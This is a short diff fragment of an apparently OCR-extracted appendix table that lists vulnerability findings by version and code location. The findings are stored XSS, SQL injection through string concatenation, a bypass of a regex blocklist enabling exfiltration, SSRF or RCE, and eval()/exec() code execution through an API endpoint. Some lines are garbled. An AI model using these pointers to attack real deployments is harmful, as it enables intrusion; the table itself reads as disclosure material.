 ```text
 Appendix Al
@@ -1131,12 +1132,10 @@ s 2.0.32 + resolver.ts:198
 Stored XSS via compileTemplate( )
 < 2.0.32 + flowI18n.ts:73 + with({})-window
 SQLi, checkSQL missing on update
-s 2.0.32 + sqlCollection: update
 SQLi via queryParentSQL() recursive CTE
 < 2.0.32 - eager-loading-tree.ts:59 - string PK concat
 Python validator bypass — exfil/SSRF/RCE
 3.1.0-3.1.2 + 38-pattern regex blocklist
-Smart Transform eval () RCE
 lambda_filter.py, startswith("lambda") only
 custom_component exec() RCE
 POST /api/v1/custom_component
@@ -1196,7 +1195,6 @@ Py
 Go+Py
 TS
 TS
-REWZ-)
 Java
 Py
 ```
